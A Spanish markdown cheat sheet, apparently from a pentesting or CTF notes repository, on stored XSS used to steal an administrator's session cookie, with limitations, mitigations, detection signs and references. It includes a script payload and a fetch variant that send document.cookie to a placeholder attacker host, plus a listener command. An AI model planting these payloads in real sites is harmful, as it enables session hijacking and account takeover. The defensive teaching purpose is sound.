---
topic: XSS almacenado — robo de cookies de administrador
tags: [web, xss, cookies, session-hijacking]
---

# XSS almacenado — robo de cookies de administrador

[🇬🇧 English](xss-cookie-exfiltration.en.md) | **Español**

## Concepto

Un XSS almacenado en un campo que revisa un administrador permite ejecutar JavaScript en su navegador. Si la cookie de sesión no tiene `HttpOnly`, el script puede leerla y enviarla al atacante, que la reutiliza para suplantar la cuenta.

## Cuándo aplica

- Un formulario público se refleja en un panel de revisión o en una cola de moderación.
- La sesión se guarda en cookies accesibles desde JavaScript.
- El administrador visita la página con un navegador automatizado o real.

## Procedimiento

1. Confirmar que el campo se refleja sin escapar en el panel.
2. Inyectar un script que cargue una URL externa con `document.cookie`.
3. Recibir la petición en un listener HTTP.
4. Decodificar la cookie y sustituirla en el navegador.

```html
<script>new Image().src='http://<ATTACKER>/?c='+encodeURIComponent(document.cookie)</script>
```

```bash
python3 -m http.server 80
# esperar la petición y decodificar el valor
```

## Variantes

- `fetch('http://<ATTACKER>/', {method:'POST', body:document.cookie})` evita el límite de URL.
- Robar el token CSRF y enviar una acción administrativa.
- Keylogger sobre el formulario de login del panel.

## Limitaciones

- `HttpOnly` impide leer la cookie de sesión.
- CSP sin `unsafe-inline` bloquea el script en línea.
- `SameSite=Strict` reduce el valor de una cookie robada fuera del contexto.

## Mitigación

- Escapar la salida y usar plantillas con autoescape.
- Cookies `HttpOnly`, `Secure` y `SameSite=Lax`.
- CSP restrictiva y saneamiento del HTML con una librería probada.

## Detección

- Peticiones salientes desde el navegador del administrador a dominios no habituales.
- Etiquetas `<script>` o manejadores `onerror` en campos de texto.
- Cookies usadas desde una IP o un user-agent diferente.

## Referencias

- [OWASP — Cross Site Scripting](https://owasp.org/www-community/attacks/xss/)
- [0xdf — Bankrobber](https://0xdf.gitlab.io/2020/03/07/htb-bankrobber.html)
- [CWE-79 — Improper Neutralization of Input](https://cwe.mitre.org/data/definitions/79.html)
